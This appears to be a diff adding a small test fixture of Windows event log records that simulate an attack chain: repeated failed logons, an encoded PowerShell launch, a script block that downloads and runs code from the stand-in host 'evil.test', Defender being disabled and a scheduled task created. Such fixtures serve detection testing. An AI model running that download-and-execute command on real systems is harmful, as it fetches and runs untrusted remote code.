@@ -1,0 +1,8 @@
+{"EventID": 4625, "Channel": "Security", "TargetUserName": "admin", "IpAddress": "10.0.0.5"}
+{"EventID": 4625, "Channel": "Security", "TargetUserName": "admin", "IpAddress": "10.0.0.5"}
+{"EventID": 4625, "Channel": "Security", "TargetUserName": "admin", "IpAddress": "10.0.0.5"}
+{"EventID": 4624, "Channel": "Security", "TargetUserName": "admin"}
+{"EventID": 1, "Channel": "Microsoft-Windows-Sysmon/Operational", "Image": "C:\\Windows\\System32\\powershell.exe", "CommandLine": "powershell -enc SQBFAFgA"}
+{"EventID": 4104, "Channel": "Microsoft-Windows-PowerShell/Operational", "ScriptBlockText": "IEX (New-Object Net.WebClient).DownloadString('http://evil.test/x')"}
+{"EventID": 5001, "Channel": "Microsoft-Windows-Windows Defender/Operational"}
+{"EventID": 4698, "Channel": "Security", "TaskName": "\\Updater"}
